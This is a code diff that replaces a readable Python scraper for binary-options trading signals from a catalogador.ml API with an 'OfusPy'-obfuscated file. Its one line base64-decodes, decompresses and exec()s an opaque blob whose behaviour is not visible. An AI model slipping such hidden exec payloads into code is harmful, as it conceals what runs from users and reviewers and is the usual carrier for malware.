@@ -1,56 +1,15 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+################################################################################
+#
+#   OfusPy 2.0.5b6 - Ofuscador Python
+#   Pacheco, Matias W. <mwpacheco@outlook.es>
+#   Copyright (c) 2021 Wehaa Portal Soft.
+#   License MIT
+#
+#   WARNING! Do 'NOT' change. You may experience problems with the file.!
+#
+################################################################################
 
-import requests
-from bs4 import BeautifulSoup
-import json
-
-def disponiveis():
-    url = 'https://catalogador.ml/api/porcentagemGale2/M1'
-
-    class_list = set()
-    page = requests.get(url)
-    soup = BeautifulSoup(page.content, 'html.parser')
-
-    todos = json.loads(page.content)
-    DISPO = todos['pares']
-    return DISPO
-
-def catalogar():
-    
-    
-    url = 'https://catalogador.ml/api/porcentagemGale2/M1'
-
-    class_list = set()
-    page = requests.get(url)
-    soup = BeautifulSoup(page.content, 'html.parser')
-
-    todos = json.loads(page.content)
-
-    par01 = todos['Todos'][0]
-    atu = todos['ultimaAtualizacao']
-    percent = par01[0]
-    #par = par01[1]
-    #padrao = par01[2]
-    per = par01[3]
-    taxa = str(per[1])
-    DISPO = todos['pares']
-    
-    
-   
-    
-    paridade = par01[1]
-    padrao = par01[2]
-    porcentagem = taxa.replace("%", "")
-    WIN = per[7]
-    G1 = per[9]
-    G2 = per[10]
-    HIT = per[8]
-    win = per[2]
-    g1 = per[4]
-    g2 = per[5]
-    hit = per[3]
-
-    Melhor = paridade, padrao, porcentagem, WIN, G1, G2, HIT, win, g1, g2, hit
-    #print(Melhor)
-
-    return paridade, padrao, porcentagem, WIN, G1, G2, HIT, win, g1, g2, hit, atu
-#catalogar()
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eNrdk1FL3EAQx98D+Q7hRJKDJTFXi63QB0Ww92BbUOiDSBmTvbstm+y6O1uln97Zy24SKYLgWw+ScL+Z+c9/ZpM0EZ1WBjPDHxy3aNNkY1SX3dvjLETOOTgUGyevldNpzP9tVZ8madLyTdYKq1Uv/nBhi+VpmmT0c0ZmX7J8h6jtaVU1gCDVFlplyk5WoEVFMg3vEba8uwTJV9VVnXtFX91IsPaXFBZJxHIslgPXlE0kmi23FKJOIWrJIEVfGC58SdmoHqkX84Y6WWowlpt8GduhapWlSj9UKRW09kVZkL9YX//4Tln77NucRLjN74aY4ehMP6TEtcSZzbiU+f0/W1Bsb47qaUU3/pHf3R6FLQG6Kegkig7O0IEUf6EBFXep+X5uytzLjdUH9HeE9QRbA2rkq0lkZB8CQ3gCvy40BYVJ4g0HO7vPAeWIFlr+j5/X7Exn6RuRkdJwLaHhxeJwwbLFInj5uf7mi8neSSi9rAP4HMEqgDpu5uv6JqBPgTyKPpDoYBtljiOIMh8D2AkMxC9sYFdc7lTY5H5gFiZk85GYt83IKV0r5u0w74BRU7qIkHQ8LiN6LAbZ8bUJX8+7ezD/hqXJwezLS5NnsCpluw==')))
